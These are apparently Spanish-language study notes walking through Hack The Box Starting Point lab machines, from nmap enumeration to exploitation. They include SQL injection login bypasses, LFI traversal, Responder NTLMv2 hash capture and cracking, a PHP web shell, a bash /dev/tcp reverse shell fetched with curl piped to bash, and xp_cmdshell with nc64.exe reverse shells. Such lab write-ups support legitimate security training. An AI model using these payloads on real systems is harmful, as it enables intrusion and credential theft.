"""
*-------------PROTOCOLS----------

ICMP --> Internet Control Message Protocol <---- Parte del conjunto de protocolos IP, es utilizado para enviar mensajes de error e 
nformacion operativa indicando por ej q un host no se localiza, o q un servicio ya no se encuentra disponible.

TCP --> Transmission Control Protocol <-- Crear conexiones dentro de una red de datos compuesta por redes de computadoras para 
ntercambiar datos

FTP --> File Transfer Protocol <-- Protocolo de red para la transferencia de archivos entre sistemas conectados a una red TCP *
 |
 V
Se suelen usar con los protocolos SSL/TLS (FTPS) o SSH-tunneling (SFTP) para agregar la capa de cifrado.

SSH ---> Secure Shell <--- Protocolo cuya funcion principal es el acceso remoto a un servidor por medio de una canal seguro en el 
ue toda la informacion esta cifrada 

HTTPS ---> Hypertext Transfer Protocol <--- Protocolo el cual nos permite hacer peticiones de datos y recursos a un servcidor.

SMB ---> Server Message Block <--- Protocolo que permite transferir archivos entre dos hosts y controla acceso a archivos y 
irectorios  <-- Usually port: 445

MSRPC ----> Es un mecanismo de interprocesos de comunicacion (IPC) que permite la comunicacion de software cliente-servidor

*-------------------------------------------------------- COMMANDS ------------------------------------------------------

Herramienta para hacer mapeo de puertos --> nmap

?$ sudo nmap {ip_target}    (esto puede no funcionar siempre ya que se suelen utilizar cortafuegos incluso en las redes LAN para 
vitar enumeracion de hosts y servicios)
flag -sV para detecyar la version de los servicios que estan corriendo en los puertos enumerados ya que tener la version siempre 
nos ayuda ya que podemos saber si el target esta desactualizado o simplemente para contener más informacion.

*---------------------------------------------------------- MAQUINAS -----------------------------------------------------------

!--------------------------------------------------------- MAQUINA MEOW --------------------------------------------------------
Se trata de una vulnerabilidad debido a una mala configuracion en el servicio telnet. El cual permitiria el ingreso al mismo con 
un usuario tipico "admin, administrator, root" y con una contraseña puesta para rapido acceso como lo es: ""
-Verificamos la concexion con el envio de una trama ICMP con el comando 
?$ ping {target_ip}

-Realizamos una enumeracion de los puertos intentando obtener informacion de los mismos con el comando 
?$ nmap -sV {target_ip}
Output:

port 23/tcp  open  telnet

?$ telnet {target_ip}

?$ root, ""

- Obtenemos el acceso

!--------------------------------------------------------- MAQUINA FAWN --------------------------------------------------------
Se trata de una vulnerabilidad debido a una mala configuracion en un puerto corriendo el protoclo FTP. La cual permitiria 
loggearnos con un usuario "anonymous" sin importar la contraseña.
Verificamos la concexion con el envio de una trama ICMP con el comando 
?$ ping {target_ip}

-Realizamos una enumeracion de los puertos intentando obtener informacion de los mismos con el comando 
?$ nmap -sV {target_ip}
Output:

port 21/tcp   open   ftp    

?$ ftp {target_ip}

?$ anonymous, "vlakls"

- Obtenemos acceso a el servidor y podemos descargar y transferir datos,
?$ get ""

?$ bye
!--------------------------------------------------------- MAQUINA Dancing --------------------------------------------------------

Se trata de una vulnerabilidad debido a una mala configuracion de un servidor SMB. El cual permitiria registrarmoss devido a
un login como usuario anonimo o invitador
-Maquina windows

-Verificamos la concexion con el envio de una trama ICMP con el comando 
?$ ping {target_ip}

-Realizamos una enumeracion de los puertos intentando obtener informacion de los mismos con el comando 
?$ nmap -sV {target_ip}
Output:

Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-18 08:26 -03
Nmap scan report for 10.129.235.13
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


Vemos que se encuentran activos los puertos 135, 139, 445, siendo este ultimo donde suele correr un servidor SMB 

?$ smbclient -V   
(corroborar la version actual del servicio smbclient, en caso de no tenerlo 
?$ sudo apt-get intall smbclient)

-Una vez con el servicio instalado correctamente 
?$ smbclient -L {target_ip}    (flag -L --> list=HOST)

-Se pide password, damos enter y el output habla de Sharename - Type - Comment
Output: 

Password for [WORKGROUP\k0v4ks]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.235.13 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

Siendo estos:

ADMIN$: "Los recursos compartidos administrativos": Recursos compartidos de red ocultos creados por la familia de Windows NT de
sistemas operativos que permiten a los administradores del sistema tener acceso remoto a cada volumen de disco en un
sistema conectado a la red. Es posible que estos recursos compartidos no se eliminen de forma permanente, pero se pueden 
eshabilitar.
C$: Recurso compartido administrativo para el volumen de disco C:\. Aquí es donde se aloja el sistema operativo.
IPC$ - La cuota de comunicación entre procesos. Se utiliza para la comunicación entre procesos a través de named
tuberías y no es parte del sistema de archivos.
WorkShares: recurso compartido personalizado.

!--------------------------------------------------------- MAQUINA Redeemer -------------------------------------------------------
En este caso se trata de volcar una db en memoria "REDIS", la cual se almacena en la memoria ram.

-Verificamos la concexion con el envio de una trama ICMP con el comando 
?$ ping {target_ip}

-Realizamos una enumeracion de los puertos intentando obtener informacion de los mismos con el comando 
?$ nmap -sV {target_ip}
Output:

port  6379/tcp     open      redis

?$ redis-cli -h {target_ip}
-h -> flag para indicar server hostname

?$ info 
Devuelve información y estadísticas sobre el servidor Redis

- Vemos que posee en el apartadp # Keyspace
La sección Keyspace proporciona estadísticas sobre el diccionario principal de cada base de datos.
db0 <-- base de datos 0

?$ select {db_name/number}  |  select 0

?$ keys *
Listar todas las keys

?get {key_name}

!----------------------------------------------------MAQUINA Appointment----------------------------------------------------------

Esta maquina consiste en una SQL Injection basica alojada en el login de un servidor web apache

Luego de corroborar la traza icmp con el comando ping dando esta exitosa la conexión, se realiza una enumeracion de puertos con la
herramienta nmap con las flags -sV para intentar tener más información sobre el versionado de los servicios que corren en los 
posibles puertos a descubrir asi tmb como con -sC, flag utilizada para realizar un examen de secuencia de comandos, esta opcion se
considera intrusiva por lo que no deberia ejecutarse contra destinos de los cuales no se posee permiso

- Al poner en el navegador {target_ip}:{open_port} nos carga una página web de apache

- Si bien se sabe que la vulnerabilidad de esta maquina es median SQLi, es recomendable y buena practica enumerar completamente 
el target a pesar de haber encontrado una vulnerabilidad, como SQLi en este caso, ya que necesitamos saber todo lo que podamos 
acerca del mismo e intentar no perdernos de nada.

- Utilizaremos una herramienta llamada gobuster, la cual corre ne Go, por lo que hay que corroborar tener instalado y en caso 
de que no instalar Go.

- Instalamos la herramienta gobuster con el comando --> 
?$ go install github.com/OJ/gobuster/v3@latest 

- Clonamos el repositorio ---> https://github.com/danielmiessler/SecLists.git <-- El cual contiene listas de contraseñas, dirs, etc

- Usamos la herramienta gobuster  con el sig comando:

?$ gobuser -u http://{target_ip}/ -w url/txt/lista

Output:
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.23.247/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/k0v4ks/Desktop/SecLists/smallDirList.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/18 19:59:07 Starting gobuster in directory enumeration mode
===============================================================
/js                  (Status: 301) [Size: 311] [--> http://10.129.23.247/js/]
/vendor              (Status: 301) [Size: 315] [--> http://10.129.23.247/vendor/]
/images              (Status: 301) [Size: 315] [--> http://10.129.23.247/images/]
/css                 (Status: 301) [Size: 312] [--> http://10.129.23.247/css/]
/fonts               (Status: 301) [Size: 314] [--> http://10.129.23.247/fonts/]
===============================================================
2022/10/18 19:59:08 Finished
===============================================================

- Podremos ver en este caso el intento de encontrar los dir js, vendor, images, etc. junto a su status.

- Luego de esta fuerza bruta fallida y triste xd, realizamos una SQL i en el form input de la direccion web

{target_ip}:{port_enumarated}  <--- la cual podemos interceptar con burpsuite para poder tener un mayor entendimiento o probar la
injection sql basica de login

username: admin'-- - | admin'# | administrator'-- - | administrator'#, etc
password: daigualporquesevaacomentarconlasqli

!----------------------------------------------------MAQUINA Sequel----------------------------------------------------------

En este caso es una maquina la cual al hacer la traza icmp comprobamos que el estado de comunicacion existe, por lo que se le hace
un escaneo de puertos con la herramienta nmap con el comando 
?$ nmap -p- -sV -sC {target_ip} -T5 -open 
y vemos que tiene abierto el
port 3306 corriendo mysql, por lo que intentamos ingresar al servicio mysql del target intentando descubrir si devido a una mala
configuracion del mismo o error de eliminar el usuario root tal vez creado en un principio para rapido acceso sin password.

?$ mysql -h {target_ip} -u root

- Caso exitoso, estamos adentro y con acceso a todas las db

?$ show databases;
?$ use {name_db};
?$ show tables;
?$ select * from {table_name};
etc

!----------------------------------------------------MAQUINA Crocodile ----------------------------------------------------------

Realizamos un envio de traza icmp, comprobamos que la conexion con la maquina es buena, por lo que empezamos con la enumeracion
de los puertos de la maquina, 

- Al probar realizar un escaneo rapido con el comando 

?$ sudo nmap -p- --open -T5 -v -n {target_ip}

Porque                  -T5                      ? Controlar el temporizado y rendimiento del escaneo para ajustar la velocidad a rapida
Porque                  -v                       ? A medida que vaya encontrando puertos arroje infor descriptiva

?$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n {target_ip}


Porque                  -p-                      ? Todo el rango de puertos
Porque                  -sS                      ? Lanzar tcp import scam
Porque                  --min-rate 5000          ? queremos emitir paquetes no más lentos de 5000 paquetes por s
Porque                  --open                   ? Solo quiero ver los puertos abiertos
Porque                  -vvv                     ? Arroje + informacion descriptiva a medida que va reconociendo los puertos
Porque                  -n                       ? No aplique resolucion a dns

- Terminando el escaneo, vemos que tenemos dos puertos, el primero el servidor 21, corriendo ftp y el segundo 80, corriendo http apache

Intentamos ingresar al servidor ftp con el comando

?$  ftp {target_ip}

Nos pide un usuario e intentamos con anonymous

- Logeo exitoso, y anilizando los directorios encontramos usuarios y contraseñas

- Intentamos loggearnos al servidor ftp con el usuario admin pero vemos que es un servidor anonimo.

- Ingresamos en el navegador a la direccion http://{target_ip}:80 ya que vimos que habia corriendo un servidor http en el port 80

- Vemos que no hay nada más alla de una simple pagina la cual no ofrece si quiera logearnos, por lo que hacemos uso de la extension
Wappalyzer para enumerar y descrubrir las tecnologias usadas, ya sea en que esta programada la app, en donde esta alojada, que 
sistema operativo corre, que frameworks, librerias, etc.

- Vemos que la app esta programada en php

- Hacemos uso de la herramienta gobuster para hacer fuerza bruta sobre posibles paths existentes

?$ gobuster dir -u http://{target_ip}:80/ -w ./Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php, html

-x para indicar terminación php en este caso y html ya que se trata de una web en html como todas asi como tmb construida en php

- Nos devuelve algunos path exitosos:
Output:
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.233.221:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ./Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
2022/10/19 09:07:19 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 58565]
/login.php            (Status: 200) [Size: 1577]
/assets               (Status: 301) [Size: 317] [--> http://10.129.233.221/assets/]
/css                  (Status: 301) [Size: 314] [--> http://10.129.233.221/css/]
/js                   (Status: 301) [Size: 313] [--> http://10.129.233.221/js/]
Progress: 3425 / 262995 (1.30%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2022/10/19 09:08:20 Finished
===============================================================

- Vemos que el path index.html y login.php existen, por lo que nos dirigimos en este caso a login.php

- Donde vemos el panel de login y con las credenciales previas 


!----------------------------------------------------MAQUINA Responder ----------------------------------------------------------

Se trata de una maquina windows la cual corre en el port 80 y en el port 5985 un servicio http

?$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n {target_ip}

Esto va a consistir en aprender un poco más acerca de windows ya que es el OS más usado a nivel global. Es más, muchas empresas 
usan Active directory, que es un servicio de microsoft que permite subir directorios a la nube quedando estos accesibles para 
usuarios definidos y administradores, para subir sus redes de dominio de Windows. Microsoft emplea NTLM (New Tehnology LAN Manager)
y Kerberos para la autenticacion de servicios.
Esta maquina va a estar destinada a como un File Inclusion para recolectar el *NetNTLMv2 hash* con una tool llamada Responder 
y posteriormente usar la tool Jhon the ripper para testear un millon de posibles contraseñas para ver si hay una coincidencia

*NetNTLMv2 hash:*
*Nueva version del protocolo NTLM, lo q hace es hashear y almacenar las contraseñas de esta manera
* Algoritmo:
*    SC = 8-byte server challenge, random
*    CC = 8-byte client challenge, random
*    CC* = (X, time, CC2, domain name)
*    v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
*    LMv2 = HMAC-MD5(v2-Hash, SC, CC)
*    NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
*    response = LMv2 | CC | NTv2 | CC*
* Ejemplo:
*    admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c
*    7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e000000005292
*    0b85f78d013c31cdb3b92f5d765c783030*


- Realizamos la enumeracion de la ip victima, y vemos que tiene corriendo el port 80 y 5985 en un servicio http

- Intentamos ingresar en la web http://{target_ip}:80 vemos que tira error de que no se puede conectar al server "unika.htb" y que
la url la remplaza por este mismo dns "unika.htb"

- Esto es porque el servidor esta empleando Alojamiento virtual basado en nombres para enviar las peticiones.
Name-Based Virtual Hosting es un metodo para host de multiples nombres dominios(con un manejo separado de cada nombre)
Esto permite que un server comparta sus recursos como la memoria y los ciclos del procesador sin requerir que todos los servicios
sean utilizados por el mimos nombre de host.

El archivo etc/host se utiliza para resolver un nombre de host en una direccion IP y por lo tanto habra que agregar dicho archivo
para este dominio para habilitar al navegador resolver la direccion para unika.htb

?$ echo "{target_ip}      {dns_name}" | sudo tee -a /etc/hosts

El comando tee lo que hace es recibir el output de un comando, motrarlo y a la par guardarlo en un archivo que se le indique, la
flag -a lo que hace es agregarlo en la ultima linea del archivo.
Basicamente copiamos el string "{target_ip}      {dns_name}" dentro del archivo hosts, el encargado de resolver un nombre a una ip.
De esta manera ahora tenemos habilitada la web unika.htb que previamente no se encontraba.

Investigando la página web podemos ver que existe una opcion para cambiar la página de idiomas, y al realizarlo el path de la 
url pide un paramtro "page" cargando este un archivo html

"http://unika.htb/index.php?page=french.html"

Siendo este lugar una potencial vulneravbilidad Local File Inclusion (LFI) si la página no se encuentra sanitizada.


(
LFI: Local File Inclusion: Se trata de cargar un archivo que no deberia ser capaz de verse alojado en el servidor al que se intenta
vulnerar
RFI: Remote File Inclusion: Muy similar al LFI pero en este caso se pueden cargar atchivos de otros servidores utilizando
potrocolos FTP, HTTP, etc
)

Si bien existen repositorios para poder intentar averiguar multiples de las más comunes y usales rutas del path, como este:
, se podria intentar con algo muy tipico.
Asi como en linux tenemos la carpeta /etc/hosts
En windows tmb existen solo que la misma se encuentra en la direccion /windows/system32/drivers/etc/hosts

Podriamos intentar ver si funciona cargando la direccion el el path, en la query page:

?"http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts"

Podemos ver que de output recibimos: 

# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file
#  contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should
#  # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated
#  by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the 
# machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com 
# # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 

Entendiendo por esto que la vulnerabilidad LFI es efectiva en este caso.

*Aclaración:

Esto es posible devido a que no existe sanitizacion en el codigo, en este caso php, el cual debe estar utilizando un include,
el include incluye todo el contenido de un archivo dejandolo disponible para que luego se pueda utilizar, por ejemplo:

!File 1 --> vars.php
<?php
  $color = 'green';
  $fruit = 'apple';
_?>
*#############################################
!File 2 --> test.php
<?php
  echo "A $color $fruit"; // output = "A"
  include 'vars.php';
  echo "A $color $fruit"; // output = "A green apple"
_?>

Por lo tanto, tenemos un potencial para incluir un archivo en nuestra maquina. Si seleccionamos un protocolo como SMB 
(Server Message Block) windows intentara autenticarse en nuestra maquina y podremos capturar el NetNTLMV2, (hashed password)

En el archivo de configuracion php.ini las opciones "tampsing_url_include" esta en "off" por default, evitando que PHP cargue
urls remotas de protocolos HTTP o FTP, para evitar RFI. Incluso si las opciones tOmod_url_include y tOmod_url_fopen estan en "off"
PHP no contempla, por lo tanto no evita, la carga de url SMB, por lo que podemos aprovechar esto para intentar capturar el NetNTLMV2

- Aca es donde entra en juego la tool Responder:

Responder puede hacer muchos tipos de ataques diferentes, en este caso la utilizaremos para establecer un SMB malicioso. Cuando la
maquina windows intete realizar la autenticacion NTLM, Responder enviara un challenge para que el servidor cifre la contraseña del
usuario. Cuando el servidor response el REsponser utilizara el challenge y la respuesta cifrada para generar el NetNTLMV2. Asi, 
podremos probar muchas contraseñas diferentes para ver si alguna generela el mismo challenge/response, esto aveces se lo conoce
como hash cracking, que lo haremos con la tool John the Ripper.

?$  git clone https://github.com/lgandx/Responder

?$ cd Responder

?$ cat Responder.conf

Si esto devuelve
"Server to start
SQL = On
SMB = On
etc"

Ya se puede comenzar.

?$ sudo python3 Responder.py -I tun0

Flag -I para interfaz 
Kernel: Nucleo del sistema operativo, encargado del hardware
tun0
El TUN0 es la interfaz VPN. Es una interfaz virtual.
El espacio de usuario en Linux está separado del espacio del kernel. Por lo tanto, la mayoría de los programas se ejecutan en el
espacio de usuario y hacen llamadas al espacio del Kernel. La interfaz TUN0 es algo que se ejecuta en el espacio del Kernel 
utilizando el módulo del Kernel Tun/Tap.

Nos dirigimos al navegador, y le decimos que incluya un recurso de nuestro servidor SMB configurado y el Responder caputa suficiente
para obtener un NetNTLMv2:

http://unika.htb/index.php?page=//{our_ip}/somefile

Veremos que tira error en cargar, pero en el Responder nos aparecera el  NetNTLMv de Administrator user:

[SMB] NTLMv2-SSP Client   : 10.129.254.90
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:15e58f76639c8f9e:030AA1938B854AFE2E8377444D0DD89F:01010000000000000087E
CD0D9E3D801477C72DD8E3EB3F90000000002000800590043003800410001001E00570049004E002D00490031003400560035004300470048004200520038
0004003400570049004E002D00490031003400560035004300470048004200520038002E0059004300380041002E004C004F00430041004C00030014005900
4300380041002E004C004F00430041004C000500140059004300380041002E004C004F00430041004C00070008000087ECD0D9E3D801060004000200000008
00300030000000000000000100000000200000A1918DC3CE333A27B0222620B4E1C2AE7500B518E90B7DAA8791004155EA122C0A0010000000000000000000
00000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100380039000000000000000000 

Copiamos todo el Hash del administrador y lo guardamos en un archivo

?$  echo "{hash_pass}" > {name.txt}

Una vez guardada la contraseña deberemos intentar descifrarla con la herramienta john the ripper que ya viene instalada

?$  john -w=/usr/shares/wordlists/rockyou.txt {name.txt}

En caso exitoso tendremos un output similar a esto:

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)       <------------- ENCONTRO UNA MATCH EXITOSO
1g 0:00:00:00 DONE (2022-10-19 18:49) 6.250g/s 38400p/s 38400c/s 38400C/s adriano..iheartyou
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

Una vez que tengamos la contraseña utilizaremos un servicio (https://github.com/Hackplayers/evil-winrm) pata intentar conectarnos
porque PoweShell no esta instalada en Linux por default, entonces Evil-WinRM que esta hecho para este tipo de escenario.

?$ evil-winrm -i {target_ip} -u {user_name} -p {password}

Una vez establecida la sesion, tendriamos acceso al sistema

cd: cd
ls: ls
cat: type

!------------------------------------------------------- MAQUINA Three ----------------------------------------------------------

Maquina windows, port 22 y 80 open, 22 --> ssh , 80 ---> http

Accediendo al port 80 vemos que en el apartado de mail pone un mail el cual es un subdominio "thetoppers.htb"

por lo que primeramente lo agregamos al archivo hosts con el comando

?$ "echo "{target_ip}       thetoppers.htb" | sudo tee -a /etc/hosts

Enumeracion de subdominios:

Un subdominio es informacion adicional agregada al comienzo del nombre de dominio de un sitio web. Permite a las aplicaciones
web separa y organizar contenido para una función específica.
Ejemplo:
hackthebox.com  <-- main domain
ctf.hackthebox.com <--- sub domain

ctf -> subdomain
hackthebox -> primary domain
.com -> TLD -> Top Level Domain

Aveces diferentes subdominios tendran diferentes direcciones IP, por lo que cuando nuestro sistema vaya a buscar el subdominio.
obtiene la direccion del servidor que maneja esa app.
Es posible tener un solo servidor que maneje multiples subdominios, esto es posible gracias a host-based routing o virtual host 
routing

Tenemos el dominio theOppers.htb, enumeraremos los subdominios con una herramienta, sea, deroxbuster, gobuster, Wfuzzm, etc.
gobuster <- 


?$  gobuster vhost -w /url/subdomains/list.txt -u htt://thetopper.htb --append-domain

flag vhost --> uses vhost (virtual host) par fuerza bruta
flag -w ---> path wordlist
flag -u ---> url

Esto nos retorna un encuentro exitoso para el subdominio s3.thetopper.htb

Que es S3 bucket? AWS S3 Buckets, un servicio de almacenamiento simple de amazon, las carpetas alojadas en dicho servicio se llaman
s3-objects

Podemos interactuar con el S3 Bucket con la ayuda de awscli,

?$ apt install awscli

Vamos a usar un valor arbitrario para configurar todos los campos, porque aveces el servidor esta configurado para no verificar la
autenticacion (pero igualmente, debe configurarse en algo para que funcione)


?$ aws configure

aws configure       
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp


Podemos listar todo los bucket s3 alojados por el sv usando ls

?$ aws --endpoint=http://s3.thetoppers.htb s3 ls

Tambien podemos enumerar s3-objects y prefijos comunes en el bucket especificado

?$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 

                           PRE images/
2022-10-20 09:18:02          0 .htaccess
2022-10-20 09:18:02      11952 index.php

Podemos ver los archivos index.php, .htaccess y un directorio llamado images en el bucket listado. Por lo que parece, esta es la
raiz del sitio web del port 80. El servidor Apache está utilizando el cubo s3 como almacenamiento.

Aprovechando que parece ser que esta subida al bucket la raiz, podemos aprovechar la caracteristica de awscli que tiene la opcion
de copiar archivos a un bucket remoto. Como el server esta corriendo PHP, podemos intentar cargar un archivo de shell PHP en el
bucket y visitar esta pagina en la web para que ejecute el archivo y logremos la ejecución del codigo remoto.

Podemos usar el comando:

?$ <?php system($_GET["cmd"]); ?>

El metodo system toma la url cmd como parametro y la ejecuta como camndo del sistema

Guardamos en un archivo el comando 

?$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

?$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

Subira al bucket s3 el archivo

?$ aws --endopoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.php

                           PRE images/
2022-10-20 18:37:29          0 .htaccess
2022-10-20 18:37:29      11952 index.php
2022-10-20 20:01:35         31 shell.php

Una vez subido, podemos ir a la web a la direccion 

http://s3.thetoppers.htb/shell.php?cmd=id    para testear si se subio y funciona correctamente, veremos el sig output:

uid=33(www-data) gid=33(www-data) groups=33(www-data) 


La respuesta del servidor contiene la salida del id del cmd, por lo que significa que funciono. Por lo tanto intentemos obtener una
reverse shell. A travez de este activaremos el host remoto para conectarse de nuevo a la ip de nuestra maquina local en el puerto 
especificado. 

Para obtener la ip address TUN0:

?$ ifconfig

Vamos a obtener un reverse shell creando un nuevo archivo shell.sg, el cual conectara con nuestra maquina local en un puerto
determinado, en este caso el 1337, conteniendo el sig payload:


?$ echo 'bash -i >& /dev/tcp/{own_ip}/1337 0>&1' > shell.sh

>& --> Evita la redireccion de salida.


Y con la herramienta nc y las flags -nvlp testeamos el port dicho

?$ nc -nvlp 1337

-n                      numeric-only IP addresses, no DNS
-v                      verbose [use twice to be more verbose]
-l                      listen mode, for inbound connects
-p port                 local port number

Una vez creado el archivo shell.sh, y estemos a la escucha del port 1337, levantamos un localhost en el puerto 8000

?$ python3 -m http.server 8000

Una vez levantado el server, creado el payload, y con el archivo php subido listo para tomar parametros estamos listos, solo falta
agregar en el parametro cmd el sig comando


? http://thetoppers.htb/shell.php?cmd=curl%20{our_ip}:8000/shell.sh|bash

De esta manera hacemos que la maquina se conecte a nuestro puerto 8000 y descargue a la par que ejecute el archivo shell.sh el cual


!-------------------------------------------------------TIER 2-------------------------------------------------------------------
!--------------------------------------------------------------------------------------------------------------------------------


! ARCHETYPE

?$ ping -c 1 {target_ip}
Esto para que solo se envie un paquete

PING 10.129.106.2 (10.129.106.2) 56(84) bytes of data.
64 bytes from 10.129.106.2: icmp_seq=1 ttl=127 time=194 ms

--- 10.129.106.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 193.848/193.848/193.848/0.000 ms

Podemos ver que el ttl es 127, los ttl 64 -> Linux, 128 -> Windows

Al hacerle un escaneo de puertos vemos que hay muchos puertos corriendo, entre ellos servicios msrpc, http, etc

Mediante el uso de smbclient (Cliente parecido al ftp para acceder a recursos compartidos en servidores smb/Cifs) intentamos
listar el host con el flag -L y sin password con el comando -N

?$ smbclient -L -N \\\\{target_ip}\\

Podremos ver el listado de recursos compartidos del servidor smb de nuestra maquina victima

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC


Ingresamos a backups


?$ smbclient -N \\\\{target_ip}\\backups


Try "help" to get a list of possible commands.
smb: \> 

?$ ls

De esta manera obtenemos control sobre el servicio smb, en donde podemos navegar entre carpetas, y podemos encontrar un archivo
"prod.dtsConfig" el cual obtenelos 

?$ get prod.dtsConfig

Dentro del archivo podemos encontrar un id junto a una password

Password=M3g4c0rp123; User ID=ARCHETYPE\sql_svc;

De esta manera podemos pasar a hacer uso de la herramienta impacket <--

?$ git clone https://github.com/SecureAuthCorp/impacket

?$ cd impacket

?$ pip3 install .

(si hay modulos perdidos)

pip3 install -r requeriments.txt

?$ cd examples 

?$ python3 mssqlclient.py -h       (help)

?$ python3 mssqlclient.py ARCHETYPE\sql_svc@{target_id} -windows-auth

Password: M3g4c0rp123

De esta manera nos hemos conectado exitosamente.

?SQL> help 

?SQL> SELECT is_srvrolemember('sysadmin');
Este comando devuelve 0 o 1, es para preguntar si el usuario actual que estamos usando cumple en el srv el rol de admin

?SQL> syC xp_cmdshell 'net user';
Esto arrojara un "error" el cual nos dice que primero nos fijemos de activar xp_cmdshell para ejecutar comandos

?SQL> EXEC sp_configure 'show advanced options', 1;
Seteamos la opcion de que nos muestre opciones avanzadas a true

?SQL> RECONFIGURE;
Guardamos los cambios reconfigurando la config

?SQL> EXEC sp_configure 'xp_cmdshell', 1;
Activamos la opcion de correr comandos

?SQL> RECONFIGURE;

?SQL> EXEC xp_cmdshell 'whoami';

Una vez que tenemos lista la posibilidad de correr comandos con le sistema, levantamos un servidor en el puerto 80, y escuchamos
con el nc en el puerto 443

En una terminal:

?$ sudo python3 -m http.server 80

En otra terminal:

?$ sudo nc -nvlp 443

Volvemos a la terminal en la que habiamos obtenido el permiso para ejecutar comandos en el sistema y ejecutamos:

?SQL> xp_cmdshell "powershell -c pwd" 
Para saber en que path estamos ubicados.

Output:

C:/windows/system32


No tenemos los suficientes privilegios para subir archivos a la carpeta del sistema y solo los usuarios administradores 
puedem realizar acciones con mayores privilegios. Por lo que necesitamos cambiar el dir de trabajo a algun dir en home donde
nuestra cuenta tenga permisos de escribir, luego de una rapida enumeracion encontramos que Downloads es perfecta para eso.

Ahora debemos descargar el archivo nc64.exe ---> https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
El cual tenemos que descargar desde el sistema al cual estamos atacando para intentar obtener una reverse shell

Descargado el nc64 y dejado en la carpeta ~ ahora si.

?SQL> xp_cmdshell "powershell cd C:\Users\sql_svc\Downloads; wget http://{own_ip}/nc64.exe -outfile nc64.exe"
cd 
En el servidor python http que levantamos en el puerto 80 vamos a ver una conexion exitosa la cual realizo el metodo GET 

?SQL> xp_cmdshell "powershell cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {own_ip} 443"

Ahora cuando veamos nuestro netcat (nc) podremos ver que la recerse shell fue exiotasa la cual nos brindo la navegacion 
del sistema finalmente.

!Privilege Escalation (Escalación de privilegios)

Para esto vamos a utilizar la herramienta llamada "winPEAS" que automatiza una gran parte de procesos de enumeracion en el
sistema target. (https://academy.hackthebox.com/course/preview/windows-privilege-escalation)
Para descargar https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe

Al igual que con el nc64.exe se lo haremos descargar a nuestro target

teniendo levantado el servidor http en el port 80

?>SQL xp_cmdshell "powershell wget http://{own_ip}/winPEASx64.exe -outfile winPEASx64.exe"

Podemos ver con el comando dir si se completo nuestra descarga, la cual podemos ver que si

?>PS .\winPEASx64.exe

Podemos ver un output ENORME, uno de los apartados de inteeres es el de CURRENT TOKEN PRIVILEGES donde podemos ver el sig output:

����������͹ Current Token privileges
� Check if you can escalate privilege using some enabled token https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#token-manipulation
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
